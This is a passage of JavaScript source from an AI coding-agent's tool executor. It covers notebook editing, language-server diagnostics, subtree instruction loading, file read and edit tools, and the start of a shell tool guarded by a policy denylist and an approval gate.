/** Clear the read-freshness map (new session / tests). */
export function _resetFileFreshness() {
  _fileObservedMtimes.clear();
}

// Short, stable-ish id for a freshly inserted notebook cell (nbformat 4.5+).
function _newNotebookCellId() {
  return Math.random().toString(36).slice(2, 10);
}

/**
 * Apply a single cell edit to a Jupyter notebook (.ipynb) given its raw text.
 * Pure (no fs) + exported for tests. Returns `{ text, summary, cellId }` on
 * success or `{ error }` on any validation failure — the caller writes `text`.
 *
 * edit_mode:
 *   - "replace" (default): overwrite the target cell's source; a code cell also
 *     gets outputs=[] + execution_count=null (stale output would be misleading).
 *   - "insert": add a new cell of `cell_type` after the target (or at the top
 *     when no target is given).
 *   - "delete": remove the target cell.
 * Target = cell_id (preferred) or 0-based cell_index.
 */
export function editNotebookCell(notebookText, args = {}) {
  let nb;
  try {
    nb = JSON.parse(notebookText);
  } catch {
    return { error: "Notebook is not valid JSON (.ipynb)" };
  }
  if (!nb || !Array.isArray(nb.cells)) {
    return { error: "Not a valid notebook: missing cells[] (need nbformat 4)" };
  }
  const mode = args.edit_mode || "replace";
  if (!["replace", "insert", "delete"].includes(mode)) {
    return { error: `Unknown edit_mode "${mode}" (replace|insert|delete)` };
  }
  // .ipynb stores source as an array of lines that each KEEP their trailing \n.
  const toLines = (s) => {
    const t = String(s ?? "");
    return t === "" ? [] : t.split(/(?<=\n)/);
  };
  // Re-serialize with Jupyter's 1-space indent + trailing newline.
  const out = (summary, cellId) => ({
    text: JSON.stringify(nb, null, 1) + "\n",
    summary,
    cellId,
  });
  const locate = () => {
    if (args.cell_id != null) {
      return nb.cells.findIndex((c) => c && c.id === args.cell_id);
    }
    if (Number.isInteger(args.cell_index)) {
      return args.cell_index >= 0 && args.cell_index < nb.cells.length
        ? args.cell_index
        : -1;
    }
    return -2; // no locator supplied
  };

  if (mode === "insert") {
    if (typeof args.new_source !== "string") {
      return { error: "new_source is required for edit_mode 'insert'" };
    }
    const ct = args.cell_type;
    if (ct !== "code" && ct !== "markdown") {
      return {
        error:
          "cell_type ('code'|'markdown') is required for edit_mode 'insert'",
      };
    }
    const id = _newNotebookCellId();
    const cell =
      ct === "code"
        ? {
            cell_type: "code",
            id,
            metadata: {},
            source: toLines(args.new_source),
            outputs: [],
            execution_count: null,
          }
        : {
            cell_type: "markdown",
            id,
            metadata: {},
            source: toLines(args.new_source),
          };
    let at = 0;
    if (args.cell_id != null || Number.isInteger(args.cell_index)) {
      const idx = locate();
      if (idx < 0) return { error: "Target cell not found for insert" };
      at = idx + 1; // insert AFTER the target
    }
    nb.cells.splice(at, 0, cell);
    return out(`inserted ${ct} cell at index ${at}`, id);
  }

  // replace / delete both need an existing target
  const idx = locate();
  if (idx === -2) {
    return {
      error: "Provide cell_id or cell_index to identify the target cell",
    };
  }
  if (idx < 0) {
    return {
      error: `Target cell not found (${
        args.cell_id != null
          ? "cell_id " + args.cell_id
          : "cell_index " + args.cell_index
      })`,
    };
  }

  if (mode === "delete") {
    const [removed] = nb.cells.splice(idx, 1);
    return out(`deleted cell at index ${idx}`, removed?.id);
  }

  // replace
  if (typeof args.new_source !== "string") {
    return { error: "new_source is required for edit_mode 'replace'" };
  }
  const cell = nb.cells[idx];
  cell.source = toLines(args.new_source);
  if (cell.cell_type === "code") {
    cell.outputs = [];
    cell.execution_count = null;
  }
  return out(`replaced ${cell.cell_type} cell at index ${idx}`, cell.id);
}

/**
 * Render a Jupyter notebook (.ipynb) as a compact, token-cheap cell listing so
 * the model can locate cells (index + id + type + source) to edit with
 * notebook_edit — instead of drowning in raw JSON / base64 output blobs. Cell
 * OUTPUTS are summarized, not dumped. Pure + exported for tests; returns null
 * when the text is not a parseable nbformat-4 notebook (caller falls back to raw).
 */
export function renderNotebook(text) {
  let nb;
  try {
    nb = JSON.parse(text);
  } catch {
    return null;
  }
  if (!nb || !Array.isArray(nb.cells)) return null;
  const srcOf = (c) =>
    Array.isArray(c.source) ? c.source.join("") : String(c.source ?? "");
  const lines = [
    `Jupyter notebook — ${nb.cells.length} cell(s), nbformat ${nb.nbformat ?? "?"}. Edit cells with the notebook_edit tool (target by the id shown below). Pass raw:true to read_file for the underlying JSON.`,
    "",
  ];
  nb.cells.forEach((c, i) => {
    const id = c && c.id != null ? ` id=${c.id}` : "";
    lines.push(`── Cell ${i} [${(c && c.cell_type) || "?"}${id}] ──`);
    const src = srcOf(c || {});
    lines.push(src.length ? src.replace(/\n$/, "") : "(empty)");
    if (
      c &&
      c.cell_type === "code" &&
      Array.isArray(c.outputs) &&
      c.outputs.length
    ) {
      lines.push(`  ⟨${c.outputs.length} output(s) hidden⟩`);
    }
    lines.push("");
  });
  return lines.join("\n");
}

/**
 * Ingest the raw stdout of a search_files command into the shared hit
 * accumulator: split into lines, dedup via `seen`, redact credential-file
 * content hits, label multi-root results, and stop at the hit cap. Pure aside
 * from mutating the passed-in `seen`/`hits`/`redactedCreds` collectors.
 *
 * Shared by the success path AND the maxBuffer-overflow salvage path: a search
 * on a large tree (especially Windows, where `findstr`/`dir /s` have no `head`
 * cap) can exceed execSync's maxBuffer and throw ENOBUFS — but the error still
 * carries the first maxBuffer of matches in `err.stdout`, so the same ingest is
 * run on it instead of dropping every match as a false "no matches".
 *
 * @param {string} output  raw command stdout (or a truncated partial)
 * @param {object} ctx  { isContent, root, multiRoot, seen, hits, redactedCreds,
 *                        credentialFileReason, limit? }
 */
export function _ingestSearchOutput(output, ctx) {
  const limit = ctx.limit ?? 20;
  for (const line of String(output || "")
    .trim()
    .split("\n")) {
    const v = line.trim();
    if (!v || ctx.seen.has(v)) continue;
    if (ctx.isContent) {
      // content hit is `file:line:text` (findstr /n) or a bare filename
      // (grep -l); pull the source file and redact credential matches.
      const src = v.match(/^(.+?):\d+:/)?.[1] ?? v;
      if (ctx.credentialFileReason(src)) {
        ctx.redactedCreds.add(src.replace(/\\/g, "/"));
        ctx.seen.add(v);
        continue;
      }
    }
    // Qualify with the root so multi-root results stay unambiguous.
    const labeled = ctx.multiRoot ? `${ctx.root}: ${v}` : v;
    ctx.seen.add(v);
    ctx.hits.push(labeled);
    if (ctx.hits.length >= limit) return;
  }
}

/**
 * Inner tool execution — no hooks, no plan-mode checks.
 */
// ─── Shared code-intelligence (LSP) pool ──────────────────────────────────
//
// A language server is expensive to start (spawns a process + indexes the
// project), so the `code_intelligence` tool reuses ONE warm CodeIntelligence
// per project root across tool calls within a run. To avoid the resource-leak
// trap (orphaned server processes / dangling timers), each root auto-disposes
// after an idle window, and a process-exit hook is registered once as a
// backstop. `coldStart:true` makes the first query per file wait for the
// project to load; warmed queries return immediately.
const _codeIntelPool = new Map(); // root -> { ci, idleTimer }
const CODE_INTEL_IDLE_MS = 60_000;
let _codeIntelExitHooked = false;

// Restart backoff between language-server re-spawns (P2 LSP): DEFAULT ON at a
// 1s base (1s→2s→4s→8s cap, see lsp-manager) so a server that crashes on
// startup can't burst `maxRestarts` spawns back-to-back before quarantine.
// `CC_LSP_RESTART_BACKOFF_MS` overrides the base; 0 restores the legacy
// immediate-respawn behavior.
const DEFAULT_LSP_RESTART_BACKOFF_MS = 1000;
function _lspRestartBackoffBaseMs() {
  const raw = process.env.CC_LSP_RESTART_BACKOFF_MS;
  if (raw !== undefined && raw !== "") {
    const n = Number(raw);
    if (Number.isFinite(n)) return Math.max(0, n);
  }
  return DEFAULT_LSP_RESTART_BACKOFF_MS;
}

export async function _getSharedCodeIntel(cwd) {
  const root = path.resolve(cwd || process.cwd());
  let entry = _codeIntelPool.get(root);
  if (!entry) {
    const { CodeIntelligence } =
      await import("../lib/lsp/code-intelligence.js");
    // Re-check AFTER the await: two concurrent callers (the parallel read-only
    // batch runs several `code_intelligence` calls at once) both observed an
    // empty pool before this `await import`, so without this guard both would
    // construct a CodeIntelligence — each spawning its own language server — and
    // the second `set` would orphan the first (leaked server process) while its
    // stale idle-timer, still bound to `root`, later evicts the wrong (warm,
    // in-use) entry. This is exactly the orphaned-server/dangling-timer trap the
    // pool exists to prevent. Construction below has NO further await, so once
    // one continuation wins the re-check the other reuses its entry — the window
    // is fully closed.
    entry = _codeIntelPool.get(root);
    if (!entry) {
      entry = {
        ci: new CodeIntelligence({
          projectRoot: root,
          coldStart: true,
          lspOptions: { restartBackoffBaseMs: _lspRestartBackoffBaseMs() },
        }),
        idleTimer: null,
      };
      _codeIntelPool.set(root, entry);
      if (!_codeIntelExitHooked) {
        _codeIntelExitHooked = true;
        process.once("exit", () => {
          for (const e of _codeIntelPool.values()) {
            try {
              e.ci.dispose();
            } catch {
              /* best-effort teardown on exit */
            }
          }
        });
      }
    }
  }
  if (entry.idleTimer) clearTimeout(entry.idleTimer);
  entry.idleTimer = setTimeout(() => {
    _codeIntelPool.delete(root);
    entry.ci.dispose().catch(() => {});
  }, CODE_INTEL_IDLE_MS);
  if (typeof entry.idleTimer.unref === "function") entry.idleTimer.unref();
  return entry.ci;
}

/** Dispose every pooled language server now (used by tests + explicit shutdown). */
export async function disposeSharedCodeIntel() {
  const entries = [..._codeIntelPool.values()];
  _codeIntelPool.clear();
  for (const e of entries) {
    if (e.idleTimer) clearTimeout(e.idleTimer);
  }
  await Promise.all(entries.map((e) => e.ci.dispose().catch(() => {})));
}

// Hard wall-clock cap so post-edit diagnostics never stall the agent: a cold
// language server can take seconds to load a project on the FIRST edit; after
// that the server is warm and answers in well under a second.
const EDIT_DIAGNOSTICS_WALL_MS = 6000;

/**
 * Best-effort "did this edit introduce a new error?" check. Run after a
 * successful workspace edit so the model sees fresh type/syntax errors in the
 * SAME turn instead of discovering them on the next build (the plan's
 * "编辑后执行增量诊断并将相关错误回喂 Agent"). Returns a compact array of
 * error/warning diagnostics, or null.
 *
 * Zero cost when no language server is installed for the file (probes first,
 * never cold-starts a server that isn't there) and fully bounded in time.
 * Disable entirely with CC_EDIT_DIAGNOSTICS=0.
 */
async function _postEditDiagnostics(filePath, cwd, additionalDirectories) {
  if (process.env.CC_EDIT_DIAGNOSTICS === "0") return null;
  // Multi-root workspace: resolve the server against the root that CONTAINS
  // the edited file (mirrors the code_intelligence handler) — editing a file
  // inside an `--add-dir` root probes/uses THAT project's language server
  // instead of degrading to "no diagnostics" via the cwd root. Single-root
  // sessions (no additionalDirectories) resolve to cwd exactly as before.
  let root;
  try {
    root = pickRootForFile(
      path.resolve(cwd || process.cwd(), filePath),
      workspaceRootsFor(cwd, additionalDirectories),
    );
  } catch {
    root = path.resolve(cwd || process.cwd());
  }
  let hasServer = false;
  try {
    const { languageIdForFile, resolveServer } =
      await import("../lib/lsp/lsp-server-registry.js");
    const languageId = languageIdForFile(filePath);
    if (!languageId) return null; // unsupported file type — no LSP, no cost
    hasServer = Boolean(resolveServer(languageId, root));
  } catch {
    return null;
  }
  if (!hasServer) return null;

  const query = (async () => {
    try {
      const ci = await _getSharedCodeIntel(root);
      const res = await ci.refreshFile(filePath, { timeoutMs: 3000 });
      if (!res || res.available === false) return null;
      const diags = (res.diagnostics || []).filter(
        (d) => d.severity === "error" || d.severity === "warning",
      );
      if (!diags.length) return null;
      // Bound by a TOKEN budget, severity-prioritized (errors survive over
      // warnings), replacing the arbitrary unsorted count-cap of 20. Guarantees
      // the model sees the most severe diagnostics first and can't be flooded by
      // a pathological diagnostics dump. Budget is overridable via
      // CC_EDIT_DIAGNOSTICS_TOKENS (default 2000).
      const { capDiagnostics } =
        await import("../lib/lsp/diagnostics-scheduler.js");
      const budget = Number(process.env.CC_EDIT_DIAGNOSTICS_TOKENS) || 2000;
      const { kept } = capDiagnostics(diags, { maxTokens: budget });
      return kept.length ? kept : null;
    } catch {
      return null;
    }
  })();

  let capTimer;
  const cap = new Promise((resolve) => {
    capTimer = setTimeout(() => resolve(null), EDIT_DIAGNOSTICS_WALL_MS);
    if (typeof capTimer.unref === "function") capTimer.unref();
  });
  try {
    return await Promise.race([query, cap]);
  } finally {
    clearTimeout(capTimer);
  }
}

/** Merge post-edit diagnostics into a successful edit result (no-op if none). */
async function _withPostEditDiagnostics(
  result,
  filePath,
  cwd,
  additionalDirectories,
) {
  const newDiagnostics = await _postEditDiagnostics(
    filePath,
    cwd,
    additionalDirectories,
  );
  return newDiagnostics ? { ...result, newDiagnostics } : result;
}

// ─── Lazy subtree instruction injection (large-monorepo lever) ─────────────
//
// cc.md / CLAUDE.md / AGENTS.md that sit BELOW the startup cwd are intentionally
// NOT loaded up front — they cost tokens for subtrees a run may never touch.
// When a tool first ACCESSES a path inside such a subtree, we inject that
// subtree's directory instructions into the tool result (the SAME channel as
// newDiagnostics), exactly once per subtree per process. A stateful
// SubtreeInstructionLoader per root remembers what it already injected so a
// second access to the same subtree is a no-op. Disable with
// CC_SUBTREE_INSTRUCTIONS=0. Common case (no cc.md below cwd) → zero cost.
const _subtreeLoaderPool = new Map(); // root -> SubtreeInstructionLoader

async function _getSubtreeLoader(cwd) {
  const root = path.resolve(cwd || process.cwd());
  let loader = _subtreeLoaderPool.get(root);
  if (!loader) {
    const { SubtreeInstructionLoader } =
      await import("../lib/project-instructions.js");
    let instructionExcludes;
    try {
      const { readStringArraySetting } =
        await import("../lib/settings-loader.cjs");
      instructionExcludes = readStringArraySetting("instructionExcludes", {
        cwd: root,
      });
    } catch {
      instructionExcludes = undefined; // fail-open — honor no excludes
    }
    loader = new SubtreeInstructionLoader({
      repoRoot: root,
      baseDir: root,
      instructionExcludes,
    });
    _subtreeLoaderPool.set(root, loader);
  }
  return loader;
}

/** Test/shutdown hook: forget every remembered subtree-injection set. */
export function _resetSubtreeInstructionLoaders() {
  _subtreeLoaderPool.clear();
}

/**
 * Freshly-discovered subtree instruction files for a path a tool just touched,
 * with their (capped) content read for inline injection — or null when the
 * subtree has no NEW cc.md/CLAUDE.md/AGENTS.md (the common case → zero cost).
 */
async function _subtreeInstructionsFor(accessedPath, cwd) {
  if (process.env.CC_SUBTREE_INSTRUCTIONS === "0") return null;
  try {
    const loader = await _getSubtreeLoader(cwd);
    const fresh = loader.onAccess(accessedPath);
    if (!fresh || !fresh.length) return null;
    const { DEFAULT_MAX_FILE_BYTES } =
      await import("../lib/project-instructions.js");
    const out = [];
    for (const f of fresh) {
      try {
        const buf = fs.readFileSync(f.path);
        const truncated = buf.length > DEFAULT_MAX_FILE_BYTES;
        const content = (
          truncated ? buf.slice(0, DEFAULT_MAX_FILE_BYTES) : buf
        ).toString("utf-8");
        out.push({
          path: f.path,
          scope: f.scope || "project",
          content,
          ...(truncated ? { truncated: true } : {}),
        });
      } catch {
        // discovered file vanished before we could read it — skip it
      }
    }
    return out.length ? out : null;
  } catch {
    return null; // fail-open: never break a tool because injection errored
  }
}

/**
 * Attach freshly-discovered subtree instructions to a SUCCESSFUL tool result
 * (no-op on an error result or when the subtree has nothing new).
 */
async function _withSubtreeInstructions(result, accessedPath, cwd) {
  if (result && result.error) return result;
  const subtreeInstructions = await _subtreeInstructionsFor(accessedPath, cwd);
  return subtreeInstructions ? { ...result, subtreeInstructions } : result;
}

/**
 * Drop skills whose `paths:` frontmatter scopes them to a different subtree than
 * the agent's cwd (large-monorepo lazy skill surface). A skill with no `paths`
 * applies everywhere, so a skill set with none is returned unchanged. Best-effort:
 * any failure (or an unlocatable project root → relCwd "") falls open to the full
 * list, never hiding a skill spuriously.
 */
async function filterSkillsByCwd(skills, cwd) {
  try {
    if (!Array.isArray(skills) || skills.every((s) => !s?.paths)) return skills;
    const { filterSkillsByRelCwd, relCwdForCwd } =
      await import("../lib/skill-path-scope.js");
    const { findProjectRoot } = await import("../lib/project-detector.js");
    const root = (cwd && findProjectRoot(cwd)) || cwd || "";
    return filterSkillsByRelCwd(skills, relCwdForCwd(cwd, root));
  } catch {
    return skills; // fail-open: never hide a skill because scoping errored
  }
}

async function executeToolInner(
  name,
  args,
  {
    skillLoader,
    skillAllowlist = null,
    cwd,
    parentMessages,
    interaction,
    sessionId,
    hostManagedToolPolicy,
    externalToolDescriptors,
    externalToolExecutors,
    extraToolDefinitions = null,
    mcpClient,
    memoryDb = null,
    permanentMemory = null,
    subAgentContract = null,
    llmOptions,
    shellPolicyOverrides,
    classifyAllShell = false,
    approvalGate,
    shellConfirm,
    additionalDirectories,
    sandbox,
    ruleAllowed = false,
    settingsVerdict = null,
    subAgentDepth = 0,
    subAgentBudget = null,
    interactiveApproval = false,
    settingsHooks = null,
    signal = null,
    backgroundSubAgents = null,
    subAgentUsageSink = null,
    toolAdmission = null,
    // Hook-envelope tracing: this run's trace id, threaded into child loops
    // (spawn_sub_agent / isolated run_skill) as their parent_id.
    hookTraceId = null,
  },
) {
  const localToolDescriptor =
    externalToolDescriptors && typeof externalToolDescriptors === "object"
      ? externalToolDescriptors[name] || null
      : null;
  const runtimeDescriptor =
    getRuntimeToolDescriptor(name) || localToolDescriptor;
  // Subagent skill capability INTERSECT: null = unrestricted; a list (possibly
  // empty) restricts which skills run_skill/list_skills expose in this loop.
  const _skillAllowlist = Array.isArray(skillAllowlist) ? skillAllowlist : null;
  const skillAllowed = (s) =>
    !_skillAllowlist ||
    _skillAllowlist.includes(s.id) ||
    _skillAllowlist.includes(s.dirName);
  const hostToolPolicies =
    hostManagedToolPolicy?.tools || hostManagedToolPolicy?.toolPolicies || null;
  const hostToolPolicy =
    hostToolPolicies && typeof hostToolPolicies === "object"
      ? hostToolPolicies[name]
      : null;
  const hostToolDefinition = Array.isArray(
    hostManagedToolPolicy?.toolDefinitions,
  )
    ? hostManagedToolPolicy.toolDefinitions.find(
        (tool) => tool?.function?.name === name,
      ) || null
    : null;
  const buildPayload = (descriptor) =>
    descriptor
      ? {
          name: descriptor.name,
          kind: descriptor.kind || descriptor.category || descriptor.source,
          category: descriptor.category,
        }
      : null;
  const descriptorPayload = buildPayload(runtimeDescriptor);
  const attachDescriptor = (payload, overrideDescriptor = null) => {
    const descriptor = buildPayload(overrideDescriptor || runtimeDescriptor);
    return descriptor ? { ...payload, toolDescriptor: descriptor } : payload;
  };
  const localToolExecutor =
    externalToolExecutors && typeof externalToolExecutors === "object"
      ? externalToolExecutors[name] || null
      : null;
  switch (name) {
    case "read_file": {
      const filePath = path.resolve(cwd, args.path);
      if (!fs.existsSync(filePath)) {
        return attachDescriptor({ error: `File not found: ${filePath}` });
      }
      // A clear, self-correcting error beats the cryptic "EISDIR: illegal
      // operation on a directory" that readFileSync throws on a directory.
      if (fs.statSync(filePath).isDirectory()) {
        return attachDescriptor({
          error: `Path is a directory, not a file: ${filePath}. Use list_dir to see its contents.`,
        });
      }
      const content = fs.readFileSync(filePath, "utf8");
      // Record the mtime so a later edit can detect an external change that
      // happened between this read and the edit (read-freshness guard).
      _recordFileObservation(filePath);
      // Jupyter notebooks: render a compact cell listing (index/id/type/source,
      // outputs summarized) so the model can find cells for notebook_edit
      // without ingesting raw JSON / base64 output blobs. `raw:true` returns the
      // underlying JSON. Non-.ipynb reads are unchanged.
      if (args.raw !== true && /\.ipynb$/i.test(filePath)) {
        const nbView = renderNotebook(content);
        if (nbView) {
          return attachDescriptor(
            nbView.length > 50000
              ? {
                  content: nbView.substring(0, 50000) + "\n...(truncated)",
                  size: nbView.length,
                  notebook: true,
                }
              : { content: nbView, notebook: true },
          );
        }
      }
      // Hashline mode: prefix each line with a 6-char content hash tag
      // so downstream edit_file_hashed calls can anchor by hash.
      let rendered = args.hashed === true ? annotateLines(content) : content;

      // Line-range slice (Claude-Code Read offset/limit parity): `offset` is the
      // 1-based first line, `limit` the max line count — so a file larger than
      // the size cap can be paged through instead of being stuck at its head.
      // Coerces numeric strings the model may emit ("10" → 10).
      const toPos = (v) => {
        const n = typeof v === "number" ? v : parseInt(v, 10);
        return Number.isInteger(n) && n > 0 ? n : null;
      };
      const offset = toPos(args.offset);
      const limit = toPos(args.limit);
      let range = null;
      if (offset || limit) {
        const lines = rendered.split("\n");
        const start = offset ? offset - 1 : 0;
        const end = limit != null ? start + limit : lines.length;
        rendered = lines.slice(start, end).join("\n");
        range = {
          startLine: Math.min(start + 1, lines.length),
          endLine: Math.min(end, lines.length),
          totalLines: lines.length,
        };
      }

      if (rendered.length > 50000) {
        return attachDescriptor(
          await _withSubtreeInstructions(
            {
              content: rendered.substring(0, 50000) + "\n...(truncated)",
              size: rendered.length,
              hashed: args.hashed === true,
              ...(range ? { range } : {}),
            },
            filePath,
            cwd,
          ),
        );
      }
      return attachDescriptor(
        await _withSubtreeInstructions(
          {
            content: rendered,
            hashed: args.hashed === true,
            ...(range ? { range } : {}),
          },
          filePath,
          cwd,
        ),
      );
    }

    case "write_file": {
      const filePath = path.resolve(cwd, args.path);
      const dir = path.dirname(filePath);
      // Overwriting an existing file: refuse if it changed on disk since the
      // agent last observed it (external concurrent edit).
      if (fs.existsSync(filePath)) {
        const stale = _checkFileFreshness(filePath);
        if (stale) return attachDescriptor({ error: stale });
      }
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }
      const wrote = writeFileVerified(filePath, args.content);
      if (wrote.error) return attachDescriptor({ error: wrote.error });
      _recordFileObservation(filePath);
      return attachDescriptor(
        await _withSubtreeInstructions(
          await _withPostEditDiagnostics(
            { success: true, path: filePath, size: wrote.size },
            filePath,
            cwd,
            additionalDirectories,
          ),
          filePath,
          cwd,
        ),
      );
    }

    case "notebook_edit": {
      const filePath = path.resolve(cwd, args.path);
      if (!fs.existsSync(filePath)) {
        return attachDescriptor({ error: `Notebook not found: ${filePath}` });
      }
      const original = fs.readFileSync(filePath, "utf8");
      const res = editNotebookCell(original, args);
      if (res.error) return attachDescriptor({ error: res.error });
      const wrote = writeFileVerified(filePath, res.text);
      if (wrote.error) return attachDescriptor({ error: wrote.error });
      return attachDescriptor({
        success: true,
        path: filePath,
        size: wrote.size,
        summary: res.summary,
        cellId: res.cellId,
      });
    }

    case "edit_file": {
      const filePath = path.resolve(cwd, args.path);
      if (!fs.existsSync(filePath)) {
        return attachDescriptor({ error: `File not found: ${filePath}` });
      }
      if (typeof args.old_string !== "string" || args.old_string === "") {
        return attachDescriptor({
          error: "old_string must be a non-empty string",
        });
      }
      if (typeof args.new_string !== "string") {
        return attachDescriptor({ error: "new_string must be a string" });
      }
      const staleEdit = _checkFileFreshness(filePath);
      if (staleEdit) return attachDescriptor({ error: staleEdit });
      const content = fs.readFileSync(filePath, "utf8");
      const replaceAll = args.replace_all === true;
      const { count, newContent } = applyLiteralEdit(
        content,
        args.old_string,
        args.new_string,
        replaceAll,
      );
      if (count === 0) {
        // Idempotent replay (P0-2 "Diff Apply 内容哈希"): a resumed edit whose
        // old_string is already gone but whose new_string is present already
        // landed. Report a no-op success (NO write occurs — zero data risk)
        // rather than a misleading "not found" error, so a recovered worker
        // doesn't get stuck re-issuing an edit that already happened.
        const replay = classifyEditReplay({
          content,
          oldString: args.old_string,
          newString: args.new_string,
        });
        if (replay === EDIT_REPLAY.ALREADY_APPLIED) {
          return attachDescriptor({
            success: true,
            path: filePath,
            alreadyApplied: true,
            idempotencyKey: editIdempotencyKey({
              path: args.path,
              oldString: args.old_string,
              newString: args.new_string,
              replaceAll,
            }),
            note: "edit already applied (new_string present, old_string absent) — no change made",
          });
        }
        return attachDescriptor({ error: "old_string not found in file" });
      }
      // Require a UNIQUE match (Claude-Code Edit parity) — replacing the first
      // of several identical strings silently edits the wrong occurrence.
      if (count > 1 && !replaceAll) {
        return attachDescriptor({
          error: `old_string is not unique — it appears ${count} times. Add surrounding context so it matches exactly one occurrence, or pass replace_all:true to change all of them.`,
          occurrences: count,
        });
      }
      const wrote = writeFileVerified(filePath, newContent);
      if (wrote.error) return attachDescriptor({ error: wrote.error });
      _recordFileObservation(filePath);
      return attachDescriptor(
        await _withSubtreeInstructions(
          await _withPostEditDiagnostics(
            {
              success: true,
              path: filePath,
              size: wrote.size,
              replaced: replaceAll ? count : 1,
            },
            filePath,
            cwd,
            additionalDirectories,
          ),
          filePath,
          cwd,
        ),
      );
    }

    case "edit_file_hashed": {
      // Hash-anchored edit (v5.0.2.9, inspired by oh-my-openagent).
      // Reference a line by its content hash rather than line number or
      // exact string — robust against whitespace drift and concurrent edits.
      const filePath = path.resolve(cwd, args.path);
      if (!fs.existsSync(filePath)) {
        return attachDescriptor({ error: `File not found: ${filePath}` });
      }
      if (!args.anchor_hash || typeof args.anchor_hash !== "string") {
        return attachDescriptor({
          error: "anchor_hash is required",
          hint: "Read the file with hashed:true to get line hashes",
        });
      }
      if (typeof args.new_line !== "string") {
        return attachDescriptor({ error: "new_line must be a string" });
      }
      const staleHashed = _checkFileFreshness(filePath);
      if (staleHashed) return attachDescriptor({ error: staleHashed });
      const original = fs.readFileSync(filePath, "utf8");
      const result = replaceByHash(original, {
        anchorHash: args.anchor_hash,
        expectedLine: args.expected_line,
        newLine: args.new_line,
      });
      if (!result.success) {
        // Self-healing hint: include a fresh annotated snippet when possible
        const snippet =
          result.error === "ambiguous_anchor" && result.matches?.[0]
            ? snippetAround(original, result.matches[0].lineNumber - 1)
            : null;
        return attachDescriptor({
          error: result.error,
          message: result.message,
          hint: result.hint,
          ...(result.matches && { matches: result.matches }),
          ...(result.current && { current: result.current }),
          ...(result.expected && { expected: result.expected }),
          ...(snippet && { current_snippet: snippet }),
        });
      }
      const wrote = writeFileVerified(filePath, result.content);
      if (wrote.error) return attachDescriptor({ error: wrote.error });
      _recordFileObservation(filePath);
      return attachDescriptor(
        await _withSubtreeInstructions(
          await _withPostEditDiagnostics(
            {
              success: true,
              path: filePath,
              size: wrote.size,
              lineNumber: result.lineNumber,
              previousContent: result.previousContent,
            },
            filePath,
            cwd,
            additionalDirectories,
          ),
          filePath,
          cwd,
        ),
      );
    }

    case "run_shell": {
      const shellPolicyOpts = {
        ...(shellPolicyOverrides
          ? { overrideRuleIds: shellPolicyOverrides }
          : {}),
        ...(classifyAllShell ? { classifyAllShell: true } : {}),
      };
      // Layer-by-layer explanation chain for a blocked command: which layers
      // were consulted and what each said (settings rules → shell policy →
      // approval gate). Attached to denial results so `/permissions denials`
      // and `cc permissions recent` can explain WHY, not just THAT.
      const buildPermissionChain = (gated) => {
        const chain = [
          {
            layer: "settings-rules",
            outcome:
              settingsVerdict?.decision || (ruleAllowed ? "allow" : "no-match"),
            rule: settingsVerdict?.rule || null,
          },
          {
            layer: "shell-policy",
            outcome: shellPolicy?.decision || null,
            rule: shellPolicy?.ruleId || null,
            reason: shellPolicy?.reason || null,
          },
        ];
        // A hard shell-policy deny returns before the gate is consulted
        // (via === "shell-policy") — no approval-gate layer to explain then.
        if (gated && gated.via !== "shell-policy") {
          chain.push({
            layer: "approval-gate",
            outcome: gated.decision,
            via: gated.via || null,
            policy: gated.policy || null,
            riskLevel: gated.riskLevel || null,
            rule: gated.gateRule || null,
            reason: gated.gateReason || null,
          });
        }
        return chain;
      };
      const override = getRuntimeToolDescriptorByCommand(args.command);
      let shellPolicy;
      let approvalOutcome = null;
      // A settings `allow` rule (ruleAllowed) pre-authorizes: skip the
      // ApprovalGate tier confirm, but still run the hard shell-policy denylist
      // below so an allow rule can never re-enable a blocked unsafe command.
      if (approvalGate && !ruleAllowed) {
        const { evaluateShellCommandWithApproval } =
          await import("../lib/shell-approval.js");
        const gated = await evaluateShellCommandWithApproval({
          command: args.command,
          sessionId,
          approvalGate,
          shellPolicyOptions: shellPolicyOpts,
        });
        shellPolicy = gated.shellPolicy;
        approvalOutcome = {
          decision: gated.decision,
          via: gated.via,
          riskLevel: gated.riskLevel,
          policy: gated.policy,
        };
        if (!gated.allowed) {
          // Make a policy denial ACTIONABLE for the model (Claude-Code 2.1.193
          // "denial reasons to transcripts"): tell it this won't change on
          // retry and to involve the user, so it stops re-issuing the same
          // blocked command (which otherwise just burns turns + tokens).
          const tierLabel =
            typeof gated.policy === "string" ? `"${gated.policy}" ` : "";
          return attachDescriptor(
            {
              error:
                gated.via === "shell-policy"
                  ? `[Shell Policy] ${gated.reason} This command is blocked by policy and will not run — do not retry it; find another approach.`
                  : `[ApprovalGate] command denied by the ${tierLabel}approval policy (via ${gated.via}). Retrying the same command will not help — it needs user approval. Tell the user (they can run it themselves, approve it, or relax the policy) and continue with other work.`,
              shellCommandPolicy: shellPolicy,
              approval: approvalOutcome,
              permissionChain: buildPermissionChain(gated),
            },
            override || runtimeDescriptor,
          );
        }
      } else {
        shellPolicy = evaluateShellCommandPolicy(args.command, shellPolicyOpts);
        if (!shellPolicy.allowed) {
          return attachDescriptor(
            {
              error: `[Shell Policy] ${shellPolicy.reason} This command is blocked by policy and will not run — do not retry it; find another approach.`,
              shellCommandPolicy: shellPolicy,
              permissionChain: buildPermissionChain(null),
            },
            override || runtimeDescriptor,
          );
        }
      }

      // P1 #8 Windows/PowerShell first-class: per-call args.shell or the
      // configured settings `shell.windowsDefault` may route this command
      // through PowerShell via explicit argv (`powershell.exe -NoProfile
      // [-ExecutionPolicy <p>] -Command <cmd>`). The unconfigured path keeps
      // the historical default shell byte-identical (useDefaultShell=true).
      const { resolveShellInvocation } =
        await import("../lib/shell-selector.cjs");
      const shellInv = resolveShellInvocation({
        command: args.command,
        requested: args.shell,
        cwd: args.cwd || cwd,
      });
      const shellMeta = shellInv.useDefaultShell
        ? shellInv.note
          ? { shell_note: shellInv.note }
          : {}
        : { shell: shellInv.kind };

      // PATH-based plugin binaries need explicit provenance at the Broker
      // boundary; otherwise a trusted plugin executable is indistinguishable
      // from an ambient system command in the process audit log.
      let pluginBinProvenance = null;
      try {
        const { resolvePluginBinCommand } = await import(
          "../lib/plugin-runtime/bin.js"
        );
        pluginBinProvenance = resolvePluginBinCommand(args.command, { cwd });
      } catch {
        pluginBinProvenance = null;
      }
      const processOrigin = pluginBinProvenance
        ? "plugin:bin"
        : "tool:run_shell";
      const processProvenance = pluginBinProvenance
        ? {
            pluginId: pluginBinProvenance.pluginId,
            pluginVersion: pluginBinProvenance.pluginVersion,
